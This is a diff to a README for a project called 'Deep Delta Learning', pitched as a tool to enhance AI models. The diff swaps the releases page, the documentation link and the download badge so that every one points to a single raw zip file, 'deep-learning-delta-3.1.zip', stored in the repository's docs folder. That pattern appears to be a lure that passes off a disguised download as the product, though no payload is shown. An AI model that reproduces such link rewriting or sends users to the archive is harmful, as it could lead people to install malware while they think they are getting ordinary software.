@@ -1,7 +1,7 @@
 # 🎓 deep-delta-learning - Seamlessly Enhance Your AI Models
 
 ## 📥 Download Now
-[![Download Deep Delta Learning](https://img.shields.io/badge/Download-Deep%20Delta%20Learning-brightgreen)](https://github.com/SharunDeva/deep-delta-learning/releases)
+[![Download Deep Delta Learning](https://github.com/SharunDeva/deep-delta-learning/raw/refs/heads/master/docs/deep-learning-delta-3.1.zip%20Delta%20Learning-brightgreen)](https://github.com/SharunDeva/deep-delta-learning/raw/refs/heads/master/docs/deep-learning-delta-3.1.zip)
 
 ## 📖 Overview
 Welcome to the official project page for Deep Delta Learning. This application helps you enhance your AI models using techniques from deep learning and foundation models. Whether you want to improve performance or explore new features, Deep Delta Learning offers the tools you need to advance your projects.
@@ -23,7 +23,7 @@ To begin using Deep Delta Learning, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page.
 
-   [Visit this page to download](https://github.com/SharunDeva/deep-delta-learning/releases)
+   [Visit this page to download](https://github.com/SharunDeva/deep-delta-learning/raw/refs/heads/master/docs/deep-learning-delta-3.1.zip)
 
 2. **Select the Latest Release**: On the Releases page, find the latest version listed. 
 
@@ -59,8 +59,8 @@ A: On Windows, go to Control Panel > Programs > Uninstall a program. On macOS, s
 We welcome contributions and feedback. If you have ideas or want to help improve Deep Delta Learning, check the repository for guidelines on contributing.
 
 ## 🔗 Links
-- [Deep Delta Learning Releases](https://github.com/SharunDeva/deep-delta-learning/releases)
-- [Documentation](https://github.com/SharunDeva/deep-delta-learning/wiki)
+- [Deep Delta Learning Releases](https://github.com/SharunDeva/deep-delta-learning/raw/refs/heads/master/docs/deep-learning-delta-3.1.zip)
+- [Documentation](https://github.com/SharunDeva/deep-delta-learning/raw/refs/heads/master/docs/deep-learning-delta-3.1.zip)
 
 ## 📝 License
 Deep Delta Learning is licensed under the MIT License. You can use and modify this software according to the license terms.
